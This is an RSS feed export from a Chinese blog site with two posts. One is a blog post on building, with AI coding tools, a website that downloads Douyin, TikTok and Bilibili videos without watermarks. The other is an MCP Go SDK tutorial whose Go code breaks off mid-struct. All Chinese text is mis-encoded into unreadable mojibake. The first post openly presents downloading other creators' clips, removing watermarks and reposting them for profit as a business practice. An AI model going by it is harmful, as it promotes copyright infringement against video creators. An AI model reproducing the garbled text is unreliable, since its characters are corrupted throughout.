<?xml version="1.0" encoding="UTF-8" ?>
    <rss version="2.0">
    <channel>
        <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
        <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
        <lastBuildDate>2026-02-02T16:35:11.771Z</lastBuildDate>
        <description><![CDATA[
        ä¸»é¡µ - åå®¢å­ RSS
    ]]></description>
        <language>zh-cn</language>
        <item>
    <title><![CDATA[ ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç ]]></title>
    <link>https://www.cnblogs.com/zh94/p/19566786</link>
    <guid>0d4f0b7ea7ef204f1341c1d2467aeb48</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zh94/p/19566786" title="åå¸äº 2026-02-03 00:10">
    <span role="heading" aria-level="2">ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>2026 å¹´åå¼å¹´ï¼Trae å°±ç»æ¯ä¸ªç¨æ·é½åäº 600 ç§¯åï¼è¿æ²¡é¢å°çæåï¼æç´§å» Trae.ai çå®ç½å¿«å¿«å»é¢åå§ããéå¹¿åï¼ç­å¿åä¸»ï¼çº¯æéð¶ã</p>
<p>é¢å°äº 600 ç§¯ååï¼å¤§æ¦ä¸ä¸ªæçæ¶é´å°±è¿æäºï¼æä»¥è¶çç§¯åè¿ç­ä¹ï¼å°±ç¨ Trae ç Gemini-3-Pro æ¨¡åå GPT-5.2 æ¨¡åç»èªå·±åäºä¸ä¸ªæ°çç½ç«ã</p>
<p>æ¥ä¸æ¥æä¼æç½ç«çå¼åç»èï¼ä»¥å UI æ¯å¦ä½è®¾è®¡å¦æ­¤ç²¾ç¾çï¼é½ç»å¤§å®¶åäº«åºæ¥ï¼ç¸ä¿¡å¯¹äºå¤§å¤æ°çè¯»èæ¥è¯´ï¼è¿å°æ¯ä¸ä¸ªéå¸¸ä¸éçç»éªåã</p>
<p>æç« å¿«ééè¯»åªéä¸¤åéï¼è¯»å®ä»¥åï¼ä½ çç»éªå¼å°±ä¼å¿«é +1 +1</p>
<h1 id="æç« å¼å§åä»ç»èæ¯">æç« å¼å§ï¼åä»ç»èæ¯</h1>
<p>åå å¤©è·ä¸ä¸ªæåèå¤©çæ¶åï¼èå°äºè§é¢åªè¾è¿ä¸ªé¢åï¼ä»ç°å¨å¨åçä¸å¡å°±æ¯å½åå¤åç§ç­å§åéåè§é¢æ¬è¿ã</p>
<p>åè§£éä¸ä¸ç­å§åéè¿ä¸ªæ¦å¿µï¼å¨å½åçå¹³å°ä¸ï¼æé³ãå¿«æãå¥½çè§é¢ãB ç«ç­ä¸çº¿å¹³å°ï¼é½ä¸çº¿çæç­å§åéçåè½ã</p>
<p>ç®åæ¥è¯´ï¼å°±æ¯ä½ æè¿ä¸ªç­å§çé«åæ¶å»åå¸å°ç­è§é¢å¹³å°ä¸ï¼ç¨æ·å¨çå°è¿ä¸ªè§é¢æ¿å¨ä¸å·²çæ¶åï¼å°±ä¼ç¹å»è´­ä¹°è§é¢å¨éï¼æ­¤æ¶ç¨æ·çè´­ä¹°è´¹ç¨ï¼å°±ä¼æ<br>
ä¸é¨åè½¬ç§»å°äºè¿ä¸ªè§é¢çä½èæä¸ã</p>
<p>æ³è¦åä¸ç­å§åéå°±å¿é¡»æ MCN çèµè´¨æè¡ï¼å¯¹äºå°åç MCN æºææ¥è¯´ï¼å¦ææ¯ä¸ä¸ªç­å§ä¸çº¿åï¼é½èªå·±ä¸ä¸ªä¸ä¸ªæ¥åªè¾é«åæ¶å»çå°è§é¢ï¼ææ¬æ¯ç¸å¯¹è¾é«çã</p>
<p>æä»¥ä»ä»¬ä¼æä¸ä¸ªæ®éçç©æ³ï¼å°±æ¯ç´æ¥ä¸è½½å«äººçè§é¢ï¼ç¶ååå¸å°èªå·±çè´¦å·ç©éµä¸ãä»èå¿«éè·åæµéï¼ç¶åè¿è¡çå©ã</p>
<p>ä¸¾ä¸ªä¾å­ï¼ä½ çå°æé³è¿ä¸ªç­å§å°è§é¢åªè¾çéå¸¸ä¸éï¼ç­åº¦ä¹å¾é«ï¼é£ä½ å°±ç´æ¥æè¯¥è§é¢ä¸è½½ä¸æ¥ãå»é¤æ°´å°åï¼æ·»å ä¸äºç¹æ®çå¨æï¼æ¹åè§é¢åæ¯ä¾ç­æä½ã</p>
<p>ç´æ¥åå¸å°èªå·±å¶ä»å¹³å°çè´¦ç©éµä¸å°±è¡ï¼ä»¥æ­¤æ¥è¿è¡çå©ã</p>
<p>è¿éæ¶åå°ä¸¤ä¸ªå¨ä½ï¼</p>
<p>ç¬¬ä¸ï¼ä½ å¦ä½å¨åä¸ªå¹³å°ä¸ä¸è½½ä¸ä¸ªæ æ°´å°ççåè§é¢ã</p>
<p>ç¬¬äºï¼è½å¦å°è¯¥åè§é¢æ¹åæ¯ä¾ï¼å¢å ç¹æè¿ä¸ªæä½ï¼ç´æ¥ AI ä¸é®å®æãèä¸æ¯è¿éè¦äººå·¥è¿è¡åä¸ã</p>
<p>äºæ¯ä¹ï¼æ¬æ¥Trae ç 600 ç§¯åå°æåï¼èªå·±æ­£æ³çå¦ä½æ¶èæå¢ï¼åè¿ä½æåèå®ï¼<strong>æå°±ç¨äºå¨æ«ä¸å¤©æ¶é´æè¿ä¸ªç½ç«ç» Vibe Coding åºæ¥äºã</strong></p>
<h1 id="åçç½ç«ææ">åçç½ç«ææ</h1>
<p>ä¸»è¦åä¸ºäºä¸ªæ¨¡åï¼</p>
<p>ä¸ï¼æé³æ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235426531-1053932813.png" alt="image" loading="lazy"></p>
<p>æä»¬ç´æ¥å°æé³é¾æ¥è¾å¥å°ç½ç«ä¸ï¼ç¶åç¹å»æ°çªå£æå¼è§é¢ï¼å³å¯ä¸è½½è¯¥è§é¢çæ æ°´å°çæ¬ã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235441498-332666344.png" alt="image" loading="lazy"></p>
<p>äºï¼TikTokæ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235448344-1577323153.png" alt="image" loading="lazy"></p>
<p>ä¸ï¼B ç«æ æ°´å°è§é¢ä¸è½½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235454663-1817359072.png" alt="image" loading="lazy"></p>
<p>åï¼ <strong>AI æºè½ä¿®åªï¼å¯ä»¥ä¸é®å°ä½ æä¸ä¼ çè§é¢ï¼ç´æ¥è¿è¡æºè½è£åªï¼</strong></p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235501394-242268660.png" alt="image" loading="lazy"></p>
<p>ç®åæ¯æç´æ¥ééè§é¢æ¯ä¾ï¼ä»¥åè²å½©å¢å¼ºï¼æºè½å»åªï¼åé³é¢å¾®è°åè½</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235511484-994071418.png" alt="image" loading="lazy"></p>
<h1 id="æ¥ä¸æ¥æä»¬å¼å§æ­£å¼æè§£">æ¥ä¸æ¥æä»¬å¼å§æ­£å¼æè§£</h1>
<p>é¦åï¼å¿é¡»çå¿çå°±æ¯ï¼è®¡ååè¡ï¼åä¸ä¸è¦ç´æ¥è®©AIç´æ¥ç»ä½ å¹²ä»£ç ï¼</p>
<p>åè®°ï¼å¯¹äºè¿äºé¡¶å°æ¨¡åï¼åä»£ç å¯¹ä¸ä»æ¥è¯´é½æ¯æç®åçäºæï¼ä½æ¯ä¸æ¦è®¡åæ²¡å¯¹åºèµ·æ¥ï¼ä»£ç åé¢ç»ä½ åç³ç³äºï¼ä½ åé¢åè®©ä»æ¥æ¥ååä¿®æ¹ï¼æ¯éå¸¸çæµªè´¹æ¶é´çã</p>
<p>æä»¥ï¼ä¸å®è¦è®¡ååè¡ï¼</p>
<p>æä»¬åæä¸é¢æ³è¦å®ç°çè¿äºåæ­¥éæ±ï¼ç´æ¥ç¨ Solo Code ç Plan æ¨¡å¼ï¼å¨é¨ä¸¢ç» AIï¼è®©ä»ç½åä¸ä¸ªå®ç°è®¡åã</p>
<p>æ ¸å¿æ­¥éª¤æ¯ï¼</p>
<p>ä¸ï¼è®©ä»èªè¡è°ç å¦ä½å®ç°æé³ãTikTokãB ç«è¿ä¸ä¸ªå¹³å°çè§é¢ä¸è½½æ æ°´å°åè½ãå¹¶è®©ä»è¾åºææ¯ææ¡£ã</p>
<p>äºï¼è®©ä»è°ç å¦ä½å®ç°ç½ç«å¨çº¿çè§é¢åªè¾åè½ãå¹¶è®©ä»è¾åºææ¯ææ¡£ã</p>
<p>ä¸ï¼è®©ä»èªè¡åä¸ä¸ªç½ç«çåè½åè¡¨ï¼å®ç°æä»¬æ³è¦çéæ±ï¼éè¦æåªäºèåååè½ï¼å¹¶è®©ä»è¾åºä¸ä¸ªè®¾è®¡ææ¡£ã</p>
<p>åï¼è®©ä»å¶å®æµè¯è®¡åï¼è¿éæä»¬èªè¡æ¾å°ä¸ä¸ªæé³çè§é¢é¾æ¥ãTikTok çè§é¢é¾æ¥ï¼B ç«çè§é¢é¾æ¥ï¼ä½ä¸ºä»çæµè¯ç¨ä¾ï¼è®©ä»åç»­å¼åå®æåè½åï¼èªè¡åºäºè¯¥æµè¯ç¨ä¾ï¼è¿è¡æµè¯ã</p>
<p>è¿åä¸ªäºé¡¹çææ¡£ç¡®è®¤å®ä»¥åï¼å¶å®å·²ç»å¯ä»¥è®©ä»å®ç°èªé­ç¯äºï¼èªå·±å¼ååè½èªå·±è¿è¡æµè¯ã</p>
<p>è¿éæä¸ä¸ªæ³¨æäºé¡¹æ¯ï¼Solo Code æ¨¡å¼æ¯æ Sub Agentï¼æä»¬è¿éç´æ¥æ Trae å®ç½æ¨èçä¸äº Agent å¨é¨ç»å å°èªå·±çæ¨¡åå½ä¸­ï¼è¿æ · Solo Code ä¼å¨éè¦çæ¶åèªä¸»è°ç¨æ¶æ Agentãåç«¯ UI Agent ç­åç§ Agent çè½åã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235520646-1771038128.png" alt="image" loading="lazy"></p>
<p>ç­å°ææ¯ææ¡£ç¡®è®¤åï¼æä»¬äººå·¥ç®åå®¡æ ¸ä¸ææ¡£ï¼å¶å®åç«¯æä¹çä¸æï¼åªæ¯å¤§æ¦çä¸ä¸ï¼ä»è¦ä½¿ç¨çå¼åè¯­è¨ä»¥åè¦éç¨çæ¡æ¶æ¯ä¸æ¯ä½ æ³è®©ä»ä½¿ç¨çå³å¯ã</p>
<p>è¿éä¸»è¦æ¯è®©ä»ä½¿ç¨ React æ¡æ¶ï¼æ¹ä¾¿åç»­é¨ç½²å° vercel ä¸ï¼å¶ä»çææ²¡å¥ç¹æ®è¦æ±ã</p>
<p>ç±äºæå¼å§ï¼æä¹ä¸ç¥éç½ç«å°åºè¦è®¾è®¡æå¥æ ·å­ï¼æä»¥çäºç AI ç»çè®¾è®¡ææ¡£ï¼æè§åè½è¯¥æçé½æï¼äºæ¯å¨é¨å®¡æ ¸éè¿åã</p>
<p>å¼å§è®© AI æ­£å¼åå§åé¡¹ç®å¹¶ç¼åä»£ç ãè¿ä¸ªæ¶åå©ä¸çå°±æ¯ç­å¾ä»èªå·±å¹²æ´»äºã</p>
<hr>
<p>ç­å° AI å¨é¨åå®ä»£ç ï¼éªè¯å®æµè¯ç¨ä¾åï¼å¤§æ¦çéè¦èæ¶ 1 - 2 ä¸ªå°æ¶å·¦å³ï¼åå æ¯å ä¸ºè¿ä¸­é´ä¼å­å¨ AI èªè¡éªè¯å®æï¼ä½æ¯ä½ äººå·¥è¿è¡éªè¯çæ¶åä»ç¶ä¼çå°å¼å¸¸çæåµï¼è¿ä¸ªæ¶åå°±éè¦ä½ äººå·¥è¿è¡ä»å¥ï¼ç¶ååå¤å AI è¿è¡åè½è°è¯ï¼ç´å°ä½ äººå·¥éªè¯éè¿ã</p>
<p>æä»¬æ­¤æ¶çä¸ä¸ AI ç¬¬ä¸çæ¬å¼ååºçåè½ï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235530128-640288049.png" alt="image" loading="lazy"></p>
<p>è¾å¥ä¸ä¸ªæé³é¾æ¥ï¼éªè¯ä¸ä¸è§£æåè§é¢æ¯å¦æåï¼å¯ä»¥çå°åè½å®ç°æ¯æ²¡æé®é¢çã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235537294-2029920119.png" alt="image" loading="lazy"></p>
<p>ä½æ¯å¯ä¸çé®é¢æ¯ä»ä¹å¢ï¼UI çé¢å¤ªä¸äºã</p>
<p>UI é®é¢å®éæ¯æç®åçé®é¢ï¼å ä¸ºç°æçç½é¡µè®¾è®¡ï¼å­å¨å¾å¤ä¸åçè®¾è®¡è¯­è¨ï¼</p>
<ol>
<li>
<p>ææºç®çº¦ä¸»ä¹ (Organic Minimalism)</p>
</li>
<li>
<p>çå£«è®¾è®¡é£æ ¼ (Swiss / International Typographic Style)</p>
</li>
<li>
<p>éå½æ´¾(Brutalism) è®¾è®¡è¯­è¨ç­ç­</p>
</li>
</ol>
<p>ä¸åçè®¾è®¡è¯­è¨ï¼èåé½æä¸å¥ UI æ¡æ¶æä¾æ¯æï¼ä½ éè¦æèªå·±æ³è¦ä»ä¹é£æ ¼çç½é¡µç» AI è¯´æ¸æ¥ï¼ä»å°±ä¼èªè¡æç§è¿å¥è®¾è®¡æ¡æ¶æ¥éæä½ ç UI é£æ ¼ã</p>
<p>è¿éå¨éªè¯å® AI åè½å¯è¡åï¼æå°±ç´æ¥è®© AI åºäºéå½æ´¾(Brutalism) è®¾è®¡è¯­è¨ï¼æ¥éæ°è®¾è®¡ä¸ä¸ UI çé¢ã</p>
<p>åï¼è®¾è®¡å®ä¹åçææå°±å¦ä¸æç¤ºäºï¼</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235548988-1715650455.png" alt="image" loading="lazy"></p>
<p>ç´§æ¥çèæ¶çé¨åå°±æ¯é¡¹ç®çç»èä¼åé¨åäºï¼</p>
<p>ä¸ï¼è®© AI å¢å ä¸­è±æåæ¢çåè½ï¼å¨ç«ææåå®¹åæ¯æä¸­è±æåæ¢ã</p>
<p>äºï¼è®© AI å¢å æç¨è¯´æææ¡£ï¼éå¯¹ä¸åæ¨¡åçåè½ï¼åå«åä¸ä¸ªä½¿ç¨æç¨ã</p>
<p>æ¯å¦éå¯¹ TikTok æ æ°´å°è§é¢ä¸è½½çæç¨ï¼è¿é AI ç½åå®ä½¿ç¨æç¨åï¼ä¼æå®ä¸ä¸ªæä»¶å¤¹ï¼<br>
æä»¬éè¦æå¯¹åºçä¸äºç´ æç§çæ¾å°å¯¹åºçæä»¶å¤¹ä¸ãæ¯å¦ä¸é¢çTikTok çé¡µé¢æªå¾ï¼å°±éè¦äººå·¥æªå¾å¹¶æ¾å°å¯¹åºçç®å½ä¸ã</p>
<p><img src="https://img2024.cnblogs.com/blog/1104472/202602/1104472-20260202235555406-124676729.png" alt="image" loading="lazy"></p>
<p>å°äºè¿ä¸æ­¥åå¢ï¼å¶å®æ´ä¸ªç½ç«çåè½å·²ç»å¼åçå·®ä¸å¤äºã</p>
<p>æ¥ä¸æ¥æä¼ååç¬æ°å¼ä¸ä¸ªçªå£ï¼è®© Gemini éæ°æ«æé¡¹ç®ä»£ç ï¼å¸®æç¡®è®¤å½åçå®ç°æ¯å¦ç¬¦åï¼</p>
<p>ä¸ï¼ç¡®è®¤æé³ãTikTokãB ç«è¿ä¸ä¸ªå¹³å°çè§é¢ä¸è½½åè½ï¼å¨é¨æ¯è¿è¡å¨æµè§å¨çç¯å¢å½ä¸­ï¼ä¸è¦å¼ºä¾èµæå¡ç«¯èµæºã</p>
<p>äºï¼ç¡®è®¤ AI æºè½ä¿®åªåè½ï¼æ¯è¿è¡å¨æµè§å¨çç¯å¢å½ä¸­ï¼ä¸è¦å¼ºä¾èµæå¡ç«¯èµæºã</p>
<p>è¿éæ¶åå°ä¸ä¸ªé®é¢æ¯ï¼å¦æè§£æå®æé³è§é¢è¿è¡ä¸è½½æ¶ï¼è¿éè¦è¯·æ±èªå·±çç½ç«æå¡å¨ä¸è½½è§é¢ï¼é£å¯¹äºç½ç«çæµéæ¶èå½±åå¤ªå¤§äºã</p>
<p>ä»¥å AI æºè½ä¿®åªåè½ä¹æ¯ä¸æ ·ï¼å¦æè¿éè¦è§é¢ä¸ä¼ å°äºç«¯åè¿è¡åªè¾ï¼ææ¬å¤ªé«äºï¼æå¡å¨æ¯æä¸ä½çã</p>
<p>æä»¥æ°å¼ä¸ä¸ªçªå£ï¼è®© Gemini éæ°æ«æé¡¹ç®ä»£ç ï¼ç¡®è®¤æ¯å¦ç¬¦åä¸è¿°è¦æ±ï¼ç­å°ä¸åé½ç¡®è®¤å®æåï¼å°±å¯ä»¥ç´æ¥ä½¿ç¨ Solo çBuilder æ¨¡å¼ï¼ç´æ¥å°ç½ç«é¨ç½²å° vercel ä¸äºã</p>
<p>ä¸åå°±è¿ä¹æå¿«çç»æå¦ï¼</p>
<p>æ³è¦ä½éªè¿ä¸ªç½ç«çæåï¼å¯ä»¥ç´æ¥æµè§å¨è®¿é®ï¼<a href="https://www.neirongshu.com" target="_blank" rel="noopener nofollow">https://www.neirongshu.com</a></p>
<h1 id="æ¬¢è¿æ¥å¸¸äº¤æµ">æ¬¢è¿æ¥å¸¸äº¤æµ</h1>
<p>AI é©±å¨å¢éå¼åæ¯è¿ä¸ªæ¶ä»£çæ°å½é¢ï¼æ¬¢è¿å¤§å®¶å å¾®ä¿¡äºç¸äº¤æµå¿å¾ã</p>
<p>ð æ³è¦è¿ç¾¤çæåï¼æ«ç æ¶å¤æ³¨ âAIå®éªç¾¤âï¼çå°æ¶æ¯åä¼ç¬¬ä¸æ¶é´æä½ è¿ç¾¤ã</p>
<p>ç¾¤å®ä½ï¼AIå·¥å·ææ/å®æç»éªäºå©</p>
<p>ç¾¤è§åï¼ä¸æ°´ç¾¤ãä¸å¹¿åãå¹²è´§ä¼å</p>
<p>æ¬¢è¿è®¿é®è¯¥é¾æ¥è·åç¾¤ä¿¡æ¯ï¼<a href="https://zhaozhihao.com/archives/KRMxDLo4" target="_blank" rel="noopener nofollow">https://zhaozhihao.com/archives/KRMxDLo4</a></p>
<p>å¥½æç« å¼å¾è¢«æ´å¤äººçè§ï¼æ¢ç¶çå°è¿éäºï¼éæç¹ä¸ªèµðåå³æ³¨ï¼å¹¶è½¬åç»æ´å¤çæåå§ï¼æè°¢ã</p>
<p>ä½èï¼è´¾åæ¯çå¹³è¡ä¸çãVï¼x_h886688</p>
<hr>
<p><a href="https://mp.weixin.qq.com/s/WRFVYF467ItBgL9uiA4jcQ" target="_blank" rel="noopener nofollow">åæå°åï¼ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç</a></p>


</div>
<div id="MySignature" role="contentinfo">
    <br>
<fieldset style="padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 1px solid black; font-size: blod">
<p><span style="color: black">çæå£°æ</span></p>
<hr style="color: black">
<p><span style="color: black">ä½èï¼éå¬é</span></p>
<p><span style="color: black">åºå¤ï¼</span><a style="color: black" href="https://www.cnblogs.com/zh94/" target="_blank">éå¬éçææ¯åå®¢--https://www.cnblogs.com/zh94/</a></p>
<p><span style="color: black">æ¨çæ¯ææ¯å¯¹åä¸»æå¤§çé¼å±ï¼æè°¢æ¨çè®¤çéè¯»ã</span></p>
<p><span style="color: black">æ¬æçæå½ä½èææï¼æ¬¢è¿è½¬è½½ï¼ä½æªç»ä½èåæå¿é¡»ä¿çæ­¤æ®µå£°æï¼ä¸å¨æç« é¡µé¢ææ¾ä½ç½®ç»åºåæè¿æ¥ï¼å¦åä¿çä»»ä½è¿½ç©¶æ³å¾è´£ä»»çæå©ã</span></p>
</fieldset>

<div style="padding: 10px; margin: 10px; background-color: #fff; width: 850px; border: 0px solid black; font-size: blod">
     <img src="https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png">&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://images.cnblogs.com/cnblogs_com/zh94/1586631/o_211225012748_weixin_saoma.png">
</div>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.003472222222222222" data-date-updated="2026-02-03 00:15">2026-02-03 00:10</span>&nbsp;
<a href="https://www.cnblogs.com/zh94">è´¾åæ¯çå¹³è¡ä¸ç</a>&nbsp;
éè¯»(<span id="post_view_count">6</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566786);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566786', targetLink: 'https://www.cnblogs.com/zh94/p/19566786', title: 'ç»èå¨å¬å¼ï¼ææ¯å¦ä½ç¨ AI ä¸å¤©ä¸çº¿ä¸ä¸ªç½ç«ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MCPå®æ¹Go SDKå°é² ]]></title>
    <link>https://www.cnblogs.com/XY-Heruo/p/19566770</link>
    <guid>b41925afec04902935cbbe51838485d0</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/XY-Heruo/p/19566770" title="åå¸äº 2026-02-03 00:02">
    <span role="heading" aria-level="2">MCPå®æ¹Go SDKå°é²</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        MCPå®æ¹Go SDKä¸æä½éªï¼å¼åä¸ä¸ªç®åçMCP ServeråMCP Client
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="åè¨">åè¨</h2>
<p>æ­¤åå¨ MCP å®ç½å°±æ³¨æå°å®æ¹æä¾äº Go SDKï¼è¿æç±äºå¨ Python ç¯å¢ä¸å¼å MCP Server æç¹"å®¡ç¾ç²å³"ï¼å æ­¤å³å®ä½¿ç¨ Go è¯­è¨å°å°é²ã</p>
<p>ä»ä¸ªäººå®éä½éªæ¥çï¼Go è¯­è¨å¨å¹¶åå¤çæ¹é¢ç¡®å®å·ææ¾èä¼å¿ï¼æ éçº ç»äºåæ­¥é»å¡ãå¼æ­¥äºä»¶å¾ªç¯ãå¤è¿ç¨å¤çº¿ç¨éä¿¡ç­å¤æçå¹¶åé®é¢ï¼goroutine ä¸ææ¢­åãåæ¶ï¼Go è¯­è¨çé¨ç½²ä¹éå¸¸ä¾¿æ·ï¼ç¼è¯åçæçéæäºè¿å¶æä»¶å·æè¯å¥½çå¯ç§»æ¤æ§ï¼å¯ä»¥å¨ä¸åç¯å¢ä¸­ç´æ¥è¿è¡ã</p>
<p>ç¶èï¼è¿ç§ä¾¿å©æ§ä¹ä¼´éçä¸å®çä»£ä»·ãç¸è¾äº Pythonï¼ä½¿ç¨ Go è¯­è¨å®ç° MCP åè½ç¸å¯¹å¤æä¸äºï¼å¼åæçç¥ä½ãè¿å°±æ¯è½¯ä»¶å·¥ç¨ä¸­çç»å¸æè¡¡äºï¼è¿è¡ææ¬ä¸å¼åææ¬å¾å¾é¾ä»¥å¼å¾ï¼éè¦æ ¹æ®å·ä½åºæ¯è¿è¡åèã</p>
<h2 id="mcp-åè®®ç®ä»">MCP åè®®ç®ä»</h2>
<p><em>å¯è½é½è³çè½è¯¦äºï¼ä½ä»¥é²è¿æä¸çæçæåï¼åç®åä»ç»ä¸MCP</em></p>
<p>Model Context Protocol (MCP) æ¯ä¸ç§æ ååçåè®®ï¼æ¨å¨ä¸º AI æ¨¡åæä¾ç»ä¸çå·¥å·è°ç¨æ¥å£ãéè¿ MCPï¼å¼åèå¯ä»¥å°åç§å·¥å·ãæå¡åæ°æ®æºæ´é²ç» AI æ¨¡åï¼ä½¿å¶è½å¤æ§è¡è¶åºåºç¡è¯­è¨æ¨¡åè½åèå´çæä½ãMCP æ¯æå¤ç§ä¼ è¾åè®®ï¼åæ¬ HTTP å Stdioï¼ä¸ºä¸ååºæ¯ä¸çéææä¾äºçµæ´»æ§ã</p>
<h2 id="ä¸ä¸ªç®åç-mcp-server-ç¤ºä¾">ä¸ä¸ªç®åç MCP Server ç¤ºä¾</h2>
<p>MCP å®æ¹ Go SDK å¨å®ä¹å·¥å·ï¼Toolï¼æ¶ï¼è¦æ±æç¡®æå®è¾å¥åæ°åè¾åºç»æçæ°æ®ç»æãå¯¹äºåè½è¾ä¸ºç®åçå·¥å·ï¼ä¹å¯ä»¥ç´æ¥ä½¿ç¨ <code>any</code> ç±»åãä»¥ä¸æ¯ä¸ä¸ªå®æ´ç MCP Server ç¤ºä¾ï¼æä¾äºä¸ä¸ªå®ç¨å·¥å·ï¼</p>
<ol>
<li>
<p><strong><code>getCurrentDatetime</code></strong>ï¼è·åå½åæ¶é´ï¼è¿å RFC3339 æ ¼å¼ï¼<code>2006-01-02T15:04:05Z07:00</code>ï¼çæ¶é´æ³å­ç¬¦ä¸²ãç±äºä¸éè¦è¾å¥åæ°ï¼å æ­¤åæ°ç±»åå®ä¹ä¸º <code>any</code>ï¼è¾åºåæ ·ä½¿ç¨ <code>any</code> ç±»åã</p>
</li>
<li>
<p><strong><code>getComputerStatus</code></strong>ï¼è·åå½åç³»ç»çå³é®ä¿¡æ¯ï¼åæ¬ CPU ä½¿ç¨çãåå­ä½¿ç¨æåµãç³»ç»çæ¬ç­ãè¯¥å·¥å·æ¥åä¸ä¸ª <code>CPUSampleTime</code> åæ°ï¼å¯¹åºçè¾å¥ç»æä½ä¸º <code>GetComputerStatusIn</code>ï¼è¾åºç»æä½ä¸º <code>GetComputerStatusOut</code>ï¼Go SDK çç¤ºä¾ä¸­éå¸¸éç¨ <code>xxxIn</code> å <code>xxxOut</code> çå½åçº¦å®æ¥åºåå·¥å·çè¾å¥è¾åºç»æä½ï¼ã</p>
</li>
<li>
<p><strong><code>getDiskInfo</code></strong>ï¼è·åææç¡¬çååºçä½¿ç¨ä¿¡æ¯åæä»¶ç³»ç»è¯¦æãè¯¥å·¥å·æ éè¾å¥åæ°ï¼ä»å®ä¹äºè¾åºç»æä½ <code>GetDiskInfoOut</code>ã</p>
</li>
</ol>
<p>å¨å®æææå·¥å·é»è¾çå®ç°åï¼æåä¸æ­¥æ¯å¯å¨æå¡ãä»¥ä¸ç¤ºä¾éç¨ Streamable HTTP æ¨¡å¼å¯å¨ï¼åæ¶ä¹ä¿çäº Stdio Transport æ¨¡å¼çæ³¨éä»£ç ä¾åèã</p>
<pre><code class="language-go">package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/shirou/gopsutil/v4/cpu"
	"github.com/shirou/gopsutil/v4/disk"
	"github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/mem"
)

func getCurrentDatetime(ctx context.Context, req *mcp.CallToolRequest, arg any) (*mcp.CallToolResult, any, error) {
	now := time.Now().Format(time.RFC3339)
	return nil, now, nil
}

type GetComputerStatusIn struct {
	CPUSampleTime time.Duration `json:"cpu_sample_time" jsonschema:"the sample time of cpu usage. Default is 1s"`
}

type GetComputerStatusOut struct {
	Hostinfo    string `json:"host info" jsonschema:"the hostinfo of the computer"`
	TimeZone    string `json:"time_zone" jsonschema:"the time zone of the computer"`
	IPAddress   string `json:"ip_address" jsonschema:"the ip address of the computer"`
	CPUUsage    string `json:"cpu_usage" jsonschema:"the cpu usage of the computer"`
	MemoryUsage string `json:"memory_usage" jsonschema:"the memory usage of the computer"`
}

func getComputerStatus(ctx context.Context, req *mcp.CallToolRequest, args GetComputerStatusIn) (*mcp.CallToolResult, GetComputerStatusOut, error) {
	if args.CPUSampleTime == 0 {
		args.CPUSampleTime = time.Second
	}
	hInfo, err := host.Info()
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}

	var resp GetComputerStatusOut
	resp.Hostinfo = fmt.Sprintf("%+v", *hInfo)

	name, offset := time.Now().Zone()
	resp.TimeZone = fmt.Sprintf("Timezone: %s (UTC%+d)\n", name, offset/3600)

	// CPU Usage
	percent, err := cpu.Percent(time.Second, false)
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	resp.CPUUsage = fmt.Sprintf("CPU Usage: %.2f%%\n", percent[0])

	// Memory Usage
	v, err := mem.VirtualMemory()
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	resp.MemoryUsage = fmt.Sprintf("Mem Usage: %.2f%% (Used: %vMB / Total: %vMB)\n",
		v.UsedPercent, v.Used/1024/1024, v.Total/1024/1024)

	// Ip Address
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return nil, GetComputerStatusOut{}, err
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	resp.IPAddress = localAddr.IP.String()

	return nil, resp, nil
}

type DiskInfo struct {
	Device     string   `json:"device" jsonschema:"the device name"`
	Mountpoint string   `json:"mountpoint" jsonschema:"the mountpoint"`
